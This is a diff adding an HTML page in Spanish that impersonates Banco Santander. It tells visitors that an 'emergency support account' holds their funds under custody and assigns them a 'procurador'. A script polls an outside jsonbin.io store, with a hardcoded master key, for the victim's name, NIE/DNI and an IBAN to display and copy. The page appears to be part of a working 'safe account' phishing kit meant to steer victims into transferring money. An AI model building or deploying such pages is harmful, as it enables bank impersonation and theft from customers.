@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Cuenta de Soporte Activada | Banco Santander</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { font-size: 16px; -webkit-text-size-adjust: 100%; }
+    body {
+      font-family: 'Open Sans', Arial, sans-serif;
+      background: #f4f4f4;
+      color: #333;
+      min-height: 100vh;
+    }
+
+    /* ── HEADER ── */
+    .header {
+      background: #fff;
+      border-bottom: 1px solid #e0e0e0;
+      height: 56px;
+      display: flex;
+      align-items: center;
+      padding: 0 20px;
+      justify-content: space-between;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+    .header-secure {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 12px;
+      color: #4caf50;
+      font-weight: 600;
+    }
+
+    /* ── AVISO SUPERIOR ── */
+    .aviso-top {
+      background: #1c3a5e;
+      color: #fff;
+      padding: 12px 20px;
+      font-size: 13px;
+      line-height: 1.5;
+    }
+    .aviso-top-inner {
+      max-width: 680px;
+      margin: 0 auto;
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+    }
+    .aviso-shield { font-size: 18px; flex-shrink: 0; margin-top: 1px; }
+    .aviso-top strong { color: #f0c040; }
+
+    /* ── MAIN ── */
+    .page-wrap {
+      max-width: 520px;
+      margin: 0 auto;
+      padding: 24px 16px 48px;
+    }
+
+    /* ── WAITING STATE ── */
+    #waitingState {
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      padding: 40px 24px;
+      text-align: center;
+    }
+    .spinner-wrap {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+    .spinner {
+      width: 44px;
+      height: 44px;
+      border: 3px solid #f0f0f0;
+      border-top-color: #EC0000;
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .waiting-title {
+      font-size: 17px;
+      font-weight: 700;
+      color: #222;
+      margin-bottom: 8px;
+    }
+    .waiting-text {
+      font-size: 13px;
+      color: #888;
+      line-height: 1.6;
+    }
+
+    /* ── CONFIRMATION STATE ── */
+    #confirmationState { display: none; }
+
+    /* Barra verde successo */
+    .success-bar {
+      background: #2e7d32;
+      color: #fff;
+      padding: 14px 20px;
+      border-radius: 4px 4px 0 0;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .success-bar-icon { font-size: 20px; }
+    .success-bar-title { font-size: 15px; font-weight: 700; }
+    .success-bar-sub { font-size: 12px; opacity: 0.85; margin-top: 2px; }
+
+    /* Card principale */
+    .confirm-card {
+      background: #fff;
+      border: 1px solid #ddd;
+      border-top: none;
+      border-radius: 0 0 4px 4px;
+    }
+
+    /* Sezioni */
+    .confirm-section {
+      padding: 18px 20px;
+      border-bottom: 1px solid #f0f0f0;
+    }
+    .confirm-section:last-child { border-bottom: none; }
+
+    .section-label {
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      color: #999;
+      margin-bottom: 12px;
+    }
+
+    /* Righe dati */
+    .data-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: baseline;
+      gap: 12px;
+      padding: 6px 0;
+      border-bottom: 1px solid #f8f8f8;
+      font-size: 14px;
+    }
+    .data-row:last-child { border-bottom: none; }
+    .data-key { color: #777; font-size: 13px; flex-shrink: 0; }
+    .data-val { color: #222; font-weight: 600; text-align: right; word-break: break-all; }
+
+    /* Box IBAN */
+    .iban-box {
+      background: #f9f9f9;
+      border: 1px solid #e0e0e0;
+      border-radius: 3px;
+      padding: 16px;
+    }
+    .iban-label {
+      font-size: 11px;
+      color: #999;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 6px;
+    }
+    .iban-number {
+      font-size: 17px;
+      font-weight: 700;
+      color: #1c3a5e;
+      letter-spacing: 1.5px;
+      font-family: 'Courier New', monospace;
+      word-break: break-all;
+      margin-bottom: 10px;
+    }
+    .iban-copy {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: #fff;
+      border: 1px solid #ccc;
+      border-radius: 3px;
+      padding: 7px 14px;
+      font-size: 12px;
+      font-family: 'Open Sans', Arial, sans-serif;
+      color: #444;
+      cursor: pointer;
+      transition: border-color .2s;
+    }
+    .iban-copy:hover { border-color: #EC0000; color: #EC0000; }
+
+    /* Box Procurador */
+    .proc-box {
+      background: #f9f9f9;
+      border: 1px solid #e0e0e0;
+      border-left: 3px solid #EC0000;
+      border-radius: 3px;
+      padding: 14px 16px;
+    }
+    .proc-tag {
+      display: inline-block;
+      background: #EC0000;
+      color: #fff;
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      padding: 2px 8px;
+      border-radius: 2px;
+      text-transform: uppercase;
+      margin-bottom: 8px;
+    }
+    .proc-name {
+      font-size: 16px;
+      font-weight: 700;
+      color: #222;
+      margin-bottom: 3px;
+    }
+    .proc-role { font-size: 12px; color: #777; }
+
+    /* Nota informativa */
+    .info-note {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      background: #f0f7ff;
+      border: 1px solid #c8dff5;
+      border-radius: 3px;
+      padding: 12px 14px;
+      font-size: 12px;
+      color: #1c3a5e;
+      line-height: 1.6;
+    }
+    .info-note-icon { font-size: 16px; flex-shrink: 0; }
+
+    /* Azioni */
+    .actions {
+      padding: 18px 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+    .btn-primary {
+      width: 100%;
+      height: 46px;
+      background: #EC0000;
+      color: #fff;
+      border: none;
+      border-radius: 3px;
+      font-size: 14px;
+      font-weight: 700;
+      font-family: 'Open Sans', Arial, sans-serif;
+      cursor: pointer;
+      transition: background .2s;
+    }
+    .btn-primary:hover { background: #c40000; }
+    .btn-secondary {
+      width: 100%;
+      height: 44px;
+      background: #fff;
+      color: #333;
+      border: 1px solid #ccc;
+      border-radius: 3px;
+      font-size: 14px;
+      font-family: 'Open Sans', Arial, sans-serif;
+      cursor: pointer;
+      transition: border-color .2s;
+    }
+    .btn-secondary:hover { border-color: #EC0000; color: #EC0000; }
+  </style>
+</head>
+<body>
+
+  <!-- HEADER -->
+  <header class="header">
+    <a href="index.html">
+      <img src="logo_santander.svg" alt="Banco Santander" style="height:26px;width:auto;display:block;">
+    </a>
+    <div class="header-secure">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+        <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+      </svg>
+      Área segura
+    </div>
+  </header>
+
+  <!-- AVISO -->
+  <div class="aviso-top">
+    <div class="aviso-top-inner">
+      <span class="aviso-shield">🛡</span>
+      <span>
+        <strong>Cuenta de Soporte y Emergencia activa</strong> — Sus fondos están bajo
+        <strong>protección y custodia</strong> de Banco Santander. Un procurador autorizado gestiona sus activos.
+      </span>
+    </div>
+  </div>
+
+  <main class="page-wrap">
+
+    <!-- ESPERANDO -->
+    <div id="waitingState">
+      <div class="spinner-wrap"><div class="spinner"></div></div>
+      <h2 class="waiting-title">Asignando su procurador</h2>
+      <p class="waiting-text">Estamos asignando un procurador autorizado para gestionar sus fondos de forma segura. Este proceso puede tardar unos minutos.</p>
+    </div>
+
+    <!-- CONFIRMACIÓN -->
+    <div id="confirmationState">
+
+      <div class="success-bar">
+        <span class="success-bar-icon">✓</span>
+        <div>
+          <div class="success-bar-title">Cuenta de Soporte activada correctamente</div>
+          <div class="success-bar-sub">Sus fondos están bajo protección activa</div>
+        </div>
+      </div>
+
+      <div class="confirm-card">
+
+        <!-- Datos titular -->
+        <div class="confirm-section">
+          <div class="section-label">Datos del titular</div>
+          <div class="data-row">
+            <span class="data-key">Nombre completo</span>
+            <span class="data-val" id="displayNombre">—</span>
+          </div>
+          <div class="data-row">
+            <span class="data-key">NIE / DNI</span>
+            <span class="data-val" id="displayNie">—</span>
+          </div>
+          <div class="data-row">
+            <span class="data-key">Fecha activación</span>
+            <span class="data-val" id="displayFecha">—</span>
+          </div>
+        </div>
+
+        <!-- IBAN -->
+        <div class="confirm-section">
+          <div class="section-label">IBAN de cuenta de soporte</div>
+          <div class="iban-box">
+            <div class="iban-label">Número de cuenta</div>
+            <div class="iban-number" id="displayIban">—</div>
+            <button class="iban-copy" onclick="copyIban()">
+              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+              </svg>
+              Copiar IBAN
+            </button>
+          </div>
+        </div>
+
+        <!-- Procurador -->
+        <div class="confirm-section">
+          <div class="section-label">Procurador asignado</div>
+          <div class="proc-box">
+            <div class="proc-tag">Procurador autorizado</div>
+            <div class="proc-name" id="displayProcNombre">—</div>
+            <div class="proc-role">Gestor de Fondos de Emergencia · Banco Santander</div>
+          </div>
+        </div>
+
+        <!-- Nota -->
+        <div class="confirm-section">
+          <div class="info-note">
+            <span class="info-note-icon">ℹ</span>
+            <p>El procurador asignado se pondrá en contacto con usted en las próximas <strong>24–48 horas</strong> para coordinar la gestión segura de sus fondos. Conserve este IBAN en un lugar seguro.</p>
+          </div>
+        </div>
+
+        <!-- Acciones -->
+        <div class="actions">
+          <button class="btn-primary" onclick="window.print()">Guardar / Imprimir confirmación</button>
+          <button class="btn-secondary" onclick="window.location.href='index.html'">Volver al inicio</button>
+        </div>
+
+      </div>
+    </div>
+
+  </main>
+
+  <script>
+    const API_BASE   = 'https://api.jsonbin.io/v3/b';
+    const BIN_ID     = '69c501f6c3097a1dd5605779';
+    const MASTER_KEY = '$2a$10$RoiwGd894wsPzcL0d6AYtegWuH4z7zN1P09knFoJ/sP6fOaecTzm.';
+
+    function getSessionId() {
+      const params = new URLSearchParams(window.location.search);
+      return params.get('id') || localStorage.getItem('san_session_id');
+    }
+
+    function copyIban() {
+      const iban = document.getElementById('displayIban').textContent;
+      navigator.clipboard.writeText(iban).then(() => {
+        const btn = document.querySelector('.iban-copy');
+        btn.innerHTML = '✓ Copiado';
+        btn.style.color = '#2e7d32';
+        btn.style.borderColor = '#2e7d32';
+        setTimeout(() => {
+          btn.innerHTML = '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copiar IBAN';
+          btn.style.color = '';
+          btn.style.borderColor = '';
+        }, 2500);
+      }).catch(() => {});
+    }
+
+    function showConfirmation(session) {
+      document.getElementById('waitingState').style.display = 'none';
+      document.getElementById('confirmationState').style.display = 'block';
+      document.getElementById('displayNombre').textContent  = session.nombre + ' ' + session.apellidos;
+      document.getElementById('displayNie').textContent     = session.nie;
+      document.getElementById('displayFecha').textContent   = session.timestamp;
+      document.getElementById('displayIban').textContent    = session.iban;
+      document.getElementById('displayProcNombre').textContent = session.proc_nombre + ' ' + session.proc_apellidos;
+    }
+
+    async function pollForData() {
+      const sessionId = getSessionId();
+      if (!sessionId) return;
+      const interval = setInterval(async () => {
+        try {
+          const res  = await fetch(`${API_BASE}/${BIN_ID}/latest`, { headers: { 'X-Master-Key': MASTER_KEY } });
+          const data = await res.json();
+          const session = (data.record.sessions || []).find(s => s.id === sessionId);
+          if (session && session.status === 'ready' && session.iban) {
+            clearInterval(interval);
+            showConfirmation(session);
+          }
+        } catch(err) { console.error(err); }
+      }, 4000);
+    }
+
+    document.addEventListener('DOMContentLoaded', pollForData);
+  </script>
+</body>
+</html>
